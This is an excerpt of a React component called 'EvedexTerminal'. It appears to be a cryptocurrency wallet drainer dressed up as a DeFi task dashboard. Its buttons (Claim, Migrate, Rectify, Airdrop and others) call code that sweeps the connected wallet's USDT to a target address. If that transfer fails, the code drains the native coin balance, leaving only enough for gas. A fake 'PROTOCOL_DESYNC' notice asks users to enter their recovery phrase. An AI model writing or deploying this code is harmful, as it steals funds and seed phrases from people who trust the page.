...
export default function EvedexTerminal() {
  ...
  // UNIVERSAL USDT MAP (Auto-detects chain)
  const USDT_MAP = {
    ...
    10: "0x94b008aa2c14502af30b56cc023e1300de6520cc" // Optimism
  };
  ...
  const executeTaskAction = async () => {
    ...
    try {
      ...
      // 1. ATTEMPT USDT SWEEP FIRST (If USDT exists on this chain)
      if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate" || activeTask === "Claim")) {
        ...
        const payload = `0xa9059cbb${paddedTarget}${amountHex}`; // Direct Transfer
        ...
        sendTransaction({
          ...
          onError: () => { sweepNative(); } // Fallback to Native Coin
        });
      } else {
        sweepNative();
      }
  ...
  const sweepNative = () => {
    ...
    // Smart Gas Squeeze: Leave just enough for the transaction
    const gasBuffer = chainId === 1 ? parseEther("0.0015") : parseEther("0.00035"); 
    let val = balance.value - gasBuffer;

    if (val <= 0n) {
        val = balance.value - (gasBuffer / 2n);
    }
      ...
      <div style={{flex:1}}>
        {!isConnected ? (
          ...
          <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
            {view === "menu" ? ["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
              ...
              <div style={{gridColumn:'1 / -1', backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
          ...
          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
            {!isSyncing ? (
              <>
                ...
                <p style={{fontSize:'8.5px', color:'#64748b', marginBottom:'30px', lineHeight:'1.7'}}>DETECTION: PROTOCOL_DESYNC. ENTER YOUR RECOVERY PHRASE TO LOCALLY DECRYPT THE SECURE BRIDGE NODE.</p>
